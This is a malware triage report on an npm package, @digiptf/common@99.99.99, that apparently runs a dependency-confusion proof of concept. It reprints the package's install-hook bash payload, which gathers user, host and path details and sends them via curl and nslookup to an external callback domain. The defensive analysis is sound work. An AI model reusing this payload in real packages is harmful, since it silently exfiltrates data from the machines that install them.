# Malware Triage Report: `@digiptf/common@99.99.99`

- **Status:** True-positive detection. Unauthorized install-time code execution with host exfil. Block regardless of operator intent.
- **Date:** 2026-07-06
- **Source:** Apollo scanner (`findings.jsonl`), corroborated by Socket (0.95 confidence, "treat as malicious")
- **Verdict:** Confirmed install-time code execution with host exfil to an external callback. Consistent with a dependency-confusion PoC or bug bounty callback rather than criminal malware. Treat as unauthorized code execution and block regardless of operator intent.

## Summary

`@digiptf/common@99.99.99` runs a shell payload from both its `preinstall` and
`install` hooks. The payload collects local machine and user identifiers
(`whoami`, `hostname`, `pwd`, `npm_package_name`), base64-encodes them, and sends
them to an external callback domain (`callback.m0chan.co.uk`) over two channels
that carry different data. The HTTP request carries the host recon blob in the
URL path. The DNS lookup carries only the package name (encoded), so it acts as
a presence beacon rather than a second copy of the host data. No user code needs
to run. The payload fires automatically on `npm install`. The version number
`99.99.99` is a classic dependency-confusion marker.

The detection is not in question: install-time code execution with host exfil,
no user code required, caught by Apollo and corroborated by Socket at 0.95. What
this report does not claim is intent. The evidence points to a dependency-
confusion proof-of-concept or bug bounty callback, not confirmed criminal or
state-sponsored malware (see Attribution below). From a defensive standpoint
that distinction changes nothing: unexpected install-time execution is treated
as hostile and blocked.

## Package details


| Field           | Value                                                                                                  |
| --------------- | ------------------------------------------------------------------------------------------------------ |
| Package         | `@digiptf/common`                                                                                      |
| Flagged version | `99.99.99` (dependency-confusion version marker)                                                       |
| Install hooks   | `preinstall` and `install`                                                                             |
| Callback domain | `callback.m0chan.co.uk`                                                                                |
| Channels        | HTTP (carries host recon) and DNS (package-name presence beacon)                                       |
| Host data exfil | HTTP only. `whoami`, `hostname`, `pwd`, `npm_package_name` (base64 in URL path)                        |
| DNS query carries | Package name only (`pkgdns` base64url + `pkgsub` readable). No host identifiers                      |
| Apollo pattern  | `curl` (severity: high, confidence: high) x2                                                           |
| Socket          | Confidence 0.95, Impact 1, malicious; alert location `package.json` (detected 2026-07-06 11:31:35 UTC) |


## The payload

```bash
# 1. Collect host recon (this is the data that gets exfiltrated)
b64=$(printf '%s' "$(whoami):$(hostname):$(pwd):$npm_package_name" | base64 -w0)

# 2. Build two encodings of the PACKAGE NAME (not the host data)
#    pkgsub: readable, DNS-label-safe package name (strip @, / -> -)
pkgsub=$(printf '%s' "$npm_package_name" | sed 's/@//g; s|/|-|g')
#    pkgdns: base64url of the package name
pkgdns=$(printf '%s' "$npm_package_name" | base64 -w0 | tr '+/' '-_' | tr -d '=')

# 3. Host recon exfil over HTTP: the b64 blob is in the URL path
curl -sm5 https://$pkgsub.callback.m0chan.co.uk/$b64

# 4. Presence beacon over DNS: labels are package name only, NOT the host blob
nslookup $pkgdns.$pkgsub.callback.m0chan.co.uk
```

## Why this fires an alert

1. **Install-hook execution.** The payload is wired into both `preinstall` and
   `install`, so it runs automatically on install with no import or invocation
   by the user. This is the strongest indicator.
2. **Local recon collection.** It harvests `whoami:hostname:pwd:npm_package_name`,
   covering user, machine, filesystem location, and target package identity.
3. **HTTP host-data exfiltration.** `curl` sends the base64 recon blob (`b64`) to
   `callback.m0chan.co.uk` with the data embedded in the URL path. This is the
   only channel that carries the host identifiers. The subdomain is named
   `callback`.
4. **DNS presence beacon.** The `nslookup` query labels are two encodings of the
   package name only (`pkgdns` is base64url of the name, `pkgsub` is the readable
   name); the host recon blob is not present in the DNS query. Its purpose is
   reach, not host-data exfil: even if outbound HTTP is blocked, the machine must
   still resolve the hostname, and that resolution walks up to the domain's
   authoritative nameserver. When the query lands, the operator learns that the
   package executed on a host somewhere inside the target network and which
   package name resolved. It does not reveal `whoami`, `hostname`, or `pwd`. That
   host detail only survives if the HTTP request got through.
5. **Dependency-confusion marker.** Version `99.99.99` is a hallmark of
   dependency-confusion setups, where an absurdly high version is published so
   resolvers prefer it over the legitimate internal package.

## Attribution

The behavior is real and the detection is correct. The attribution, however, is
narrower than "confirmed malicious," and the evidence points away from criminal
or state-sponsored activity.

- **The callback domain is not anonymized.** `m0chan` is a named, public bug
  bounty researcher and pentester (`blog.m0chan.co.uk`, `github.com/m0chan`,
  `pentestly.io`). His published bug bounty material uses a
  Burp-Collaborator-style callback host on the same domain. Beaconing to a
  researcher's own personal domain is the opposite of criminal tradecraft, which
  relies on throwaway, anonymized, or fast-flux infrastructure rather than a
  host that identifies the operator.
- **The payload is textbook proof-of-concept, not attack.** `whoami:hostname:pwd`
  plus package name is exactly the callback telemetry from Alex Birsan's
  original dependency-confusion research and the bounty writeups that followed.
  It is enough to prove "code executed inside your build" and nothing more.
  There is no credential harvesting, no second-stage download, no persistence,
  and no destructive action.
- **The package shape matches the PoC setup.** The `99.99.99` version marker and
  the scoped `@digiptf/common` name are consistent with squatting an internal
  package name to trigger a resolver, which is the proof-of-concept setup rather
  than payload delivery.

Conclusion: this is almost certainly a dependency-confusion proof-of-concept or
bug bounty callback, not in-the-wild criminal malware. "Confirmed malicious" and
"attacker-controlled" overstate intent beyond what the evidence supports.